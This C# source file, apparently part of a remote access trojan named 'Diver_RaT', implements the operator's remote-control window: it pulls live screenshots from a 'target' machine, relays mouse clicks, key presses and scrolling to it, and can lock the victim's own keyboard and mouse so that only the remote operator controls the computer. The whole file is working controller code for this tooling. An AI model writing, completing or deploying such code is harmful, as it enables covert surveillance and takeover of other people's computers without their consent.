using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Text.Json;
using System.Windows;
using System.Windows.Input;
using System.Windows.Media.Imaging;
using System.Windows.Threading;

namespace Diver_RaT
{
    public partial class RemoteControlWindow : Window
    {
        private readonly TcpServer _server;
        private readonly Device _device;
        private readonly DispatcherTimer _previewTimer;
        private readonly DispatcherTimer _moveTimer;
        private bool _connected;
        private bool _capturing;
        private Point? _pendingMove;
        private int _screenWidth = 1920;
        private int _screenHeight = 1080;

        public RemoteControlWindow(TcpServer server, Device device)
        {
            InitializeComponent();
            _server = server;
            _device = device;
            Title = $"Remote Control - {device.ComputerName}";
            TargetText.Text = $"{device.ComputerName} ({device.IpAddress})";

            _previewTimer = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(300) };
            _previewTimer.Tick += (_, _) => _ = RefreshFrame();

            _moveTimer = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(30) };
            _moveTimer.Tick += (_, _) => FlushMove();
        }

        private async void ConnectButton_Click(object sender, RoutedEventArgs e)
        {
            if (_connected)
            {
                _previewTimer.Stop();
                _moveTimer.Stop();
                _pendingMove = null;
                _connected = false;
                ConnectButton.Content = "\U0001f5a5  Connect";
                LockButton.IsEnabled = false;
                Placeholder.Visibility = Visibility.Visible;
                StatusText.Text = "Disconnected";
                return;
            }

            StatusText.Text = "Connecting...";
            // Get screen size
            var sizeResult = await _server.SendCommandAsync(_device.Id, "GET_SCREEN_SIZE", timeoutMs: 10000);
            if (sizeResult.Success && !string.IsNullOrEmpty(sizeResult.Result))
            {
                try
                {
                    using var doc = JsonDocument.Parse(sizeResult.Result);
                    if (doc.RootElement.TryGetProperty("width", out var w)) _screenWidth = w.GetInt32();
                    if (doc.RootElement.TryGetProperty("height", out var h)) _screenHeight = h.GetInt32();
                }
                catch { }
            }
            ScreenSizeText.Text = $"  {_screenWidth}x{_screenHeight}";

            _connected = true;
            ConnectButton.Content = "\U0001f5a5  Disconnect";
            LockButton.IsEnabled = true;
            Placeholder.Visibility = Visibility.Collapsed;
            StatusText.Text = "Connected - move/click on the preview to control the target";
            StartPreview();
            _moveTimer.Start();
            Focus();
        }

        private void StartPreview()
        {
            _previewTimer.Start();
            _ = RefreshFrame();
        }

        private async System.Threading.Tasks.Task RefreshFrame()
        {
            if (!_connected || _capturing) return;
            _capturing = true;
            try
            {
                var result = await _server.SendCommandAsync(_device.Id, "SCREENSHOT", timeoutMs: 15000);
                if (result.Success && !string.IsNullOrEmpty(result.Result) &&
                    (result.Result.StartsWith("/9j/") || result.Result.StartsWith("iVBOR") || result.Result.StartsWith("Qk")))
                {
                    ScreenImage.Source = ImageHelper.FromBase64(result.Result);
                    Placeholder.Visibility = Visibility.Collapsed;
                    StatusText.Text = $"Live preview. Last: {DateTime.Now:HH:mm:ss}";
                }
                else
                {
                    StatusText.Text = $"No frame: {result.Error ?? result.Result}";
                }
            }
            catch (Exception ex)
            {
                StatusText.Text = $"Preview error: {ex.Message}";
            }
            finally { _capturing = false; }
        }

        private void ScreenImage_MouseMove(object sender, MouseEventArgs e)
        {
            if (!_connected) return;
            var pos = TranslateToScreen(e.GetPosition(ScreenImage));
            if (pos != null) _pendingMove = pos;
            e.Handled = true;
        }

        private void FlushMove()
        {
            if (!_connected) return;
            var p = _pendingMove;
            if (p == null) return;
            _pendingMove = null;
            _ = _server.SendCommandAsync(_device.Id, "MOUSE_MOVE",
                new Dictionary<string, string>
                {
                    ["x"] = ((int)p.Value.X).ToString(),
                    ["y"] = ((int)p.Value.Y).ToString()
                }, timeoutMs: 1000);
        }

        private async void ScreenImage_MouseDown(object sender, MouseButtonEventArgs e)
        {
            if (!_connected) return;
            Focus();
            var pos = TranslateToScreen(e.GetPosition(ScreenImage));
            if (pos == null) return;
            var button = e.ChangedButton == MouseButton.Right ? "right" : e.ChangedButton == MouseButton.Middle ? "middle" : "left";

            if (e.ClickCount >= 2)
            {
                await _server.SendCommandAsync(_device.Id, "MOUSE_CLICK",
                    new Dictionary<string, string> { ["x"] = pos.Value.X.ToString(), ["y"] = pos.Value.Y.ToString(), ["button"] = button });
                await _server.SendCommandAsync(_device.Id, "MOUSE_CLICK",
                    new Dictionary<string, string> { ["x"] = pos.Value.X.ToString(), ["y"] = pos.Value.Y.ToString(), ["button"] = button });
                StatusText.Text = $"Double-click {button} at {pos.Value.X},{pos.Value.Y}";
            }
            else
            {
                await _server.SendCommandAsync(_device.Id, "MOUSE_CLICK",
                    new Dictionary<string, string> { ["x"] = pos.Value.X.ToString(), ["y"] = pos.Value.Y.ToString(), ["button"] = button });
                StatusText.Text = $"Click {button} at {pos.Value.X},{pos.Value.Y}";
            }
            e.Handled = true;
        }

        private async void ScreenImage_MouseUp(object sender, MouseButtonEventArgs e) { e.Handled = true; }

        private async void ScreenImage_MouseWheel(object sender, MouseWheelEventArgs e)
        {
            if (!_connected) return;
            var delta = e.Delta > 0 ? 120 : -120;
            await _server.SendCommandAsync(_device.Id, "SCROLL",
                new Dictionary<string, string> { ["delta"] = delta.ToString() });
            StatusText.Text = $"Scroll {delta}";
            e.Handled = true;
        }

        protected override void OnKeyDown(KeyEventArgs e)
        {
            if (!_connected) { base.OnKeyDown(e); return; }
            var vk = KeyToVk(e.Key);
            if (vk > 0)
            {
                _ = _server.SendCommandAsync(_device.Id, "KEY_DOWN", new Dictionary<string, string> { ["code"] = vk.ToString() }, timeoutMs: 3000);
                StatusText.Text = $"Key down: {e.Key} (VK={vk})";
            }
            e.Handled = true;
            base.OnKeyDown(e);
        }

        protected override void OnKeyUp(KeyEventArgs e)
        {
            if (!_connected) { base.OnKeyUp(e); return; }
            var vk = KeyToVk(e.Key);
            if (vk > 0)
            {
                _ = _server.SendCommandAsync(_device.Id, "KEY_UP", new Dictionary<string, string> { ["code"] = vk.ToString() }, timeoutMs: 3000);
            }
            e.Handled = true;
            base.OnKeyUp(e);
        }

        private async void LockButton_Click(object sender, RoutedEventArgs e)
        {
            var result = await _server.SendCommandAsync(_device.Id, "LOCK_INPUT",
                new Dictionary<string, string> { ["enabled"] = "1" });
            StatusText.Text = result.Success ? "Target input locked - only remote control works" : $"Lock failed: {result.Error}";
        }

        private Point? TranslateToScreen(Point imagePoint)
        {
            if (ScreenImage.Source == null) return null;
            var bmp = ScreenImage.Source as BitmapSource;
            if (bmp == null) return null;
            var imgW = bmp.PixelWidth; var imgH = bmp.PixelHeight;
            if (imgW == 0 || imgH == 0) return null;
            var actual = ScreenImage.RenderSize;
            if (actual.Width == 0 || actual.Height == 0) return null;
            // Uniform stretch: find scale and offset
            double scaleX = actual.Width / imgW;
            double scaleY = actual.Height / imgH;
            double scale = Math.Min(scaleX, scaleY);
            double offsetX = (actual.Width - imgW * scale) / 2;
            double offsetY = (actual.Height - imgH * scale) / 2;
            var imgX = (imagePoint.X - offsetX) / scale;
            var imgY = (imagePoint.Y - offsetY) / scale;
            // Map to screen coordinates
            var screenX = (int)(imgX / imgW * _screenWidth);
            var screenY = (int)(imgY / imgH * _screenHeight);
            return new Point(screenX, screenY);
        }

        private static int KeyToVk(Key key)
        {
            // Map common WPF keys to Win32 virtual key codes
            return key switch
            {
                Key.A => 0x41, Key.B => 0x42, Key.C => 0x43, Key.D => 0x44, Key.E => 0x45,
                Key.F => 0x46, Key.G => 0x47, Key.H => 0x48, Key.I => 0x49, Key.J => 0x4A,
                Key.K => 0x4B, Key.L => 0x4C, Key.M => 0x4D, Key.N => 0x4E, Key.O => 0x4F,
                Key.P => 0x50, Key.Q => 0x51, Key.R => 0x52, Key.S => 0x53, Key.T => 0x54,
                Key.U => 0x55, Key.V => 0x56, Key.W => 0x57, Key.X => 0x58, Key.Y => 0x59,
                Key.Z => 0x5A,
                Key.D0 => 0x30, Key.D1 => 0x31, Key.D2 => 0x32, Key.D3 => 0x33, Key.D4 => 0x34,
                Key.D5 => 0x35, Key.D6 => 0x36, Key.D7 => 0x37, Key.D8 => 0x38, Key.D9 => 0x39,
                Key.Space => 0x20,
                Key.Enter => 0x0D,
                Key.Back => 0x08, Key.Tab => 0x09, Key.Escape => 0x1B,
                Key.Left => 0x25, Key.Up => 0x26, Key.Right => 0x27, Key.Down => 0x28,
                Key.Delete => 0x2E, Key.Insert => 0x2D, Key.Home => 0x24, Key.End => 0x23,
                Key.PageUp => 0x21, Key.PageDown => 0x22,
                Key.LeftShift => 0xA0, Key.RightShift => 0xA1,
                Key.LeftCtrl => 0xA2, Key.RightCtrl => 0xA3,
                Key.LeftAlt => 0xA4, Key.RightAlt => 0xA5,
                Key.LWin => 0x5B, Key.RWin => 0x5C,
                Key.Capital => 0x14, Key.NumLock => 0x90, Key.Scroll => 0x91,
                Key.F1 => 0x70, Key.F2 => 0x71, Key.F3 => 0x72, Key.F4 => 0x73,
                Key.F5 => 0x74, Key.F6 => 0x75, Key.F7 => 0x76, Key.F8 => 0x77,
                Key.F9 => 0x78, Key.F10 => 0x79, Key.F11 => 0x7A, Key.F12 => 0x7B,
                _ => 0
            };
        }

        private void Window_Closing(object? sender, CancelEventArgs e)
        {
            _previewTimer.Stop();
            _moveTimer.Stop();
            _pendingMove = null;
            if (_connected)
            {
                _ = _server.SendCommandAsync(_device.Id, "LOCK_INPUT",
                    new Dictionary<string, string> { ["enabled"] = "0" }, timeoutMs: 3000);
            }
        }
    }
}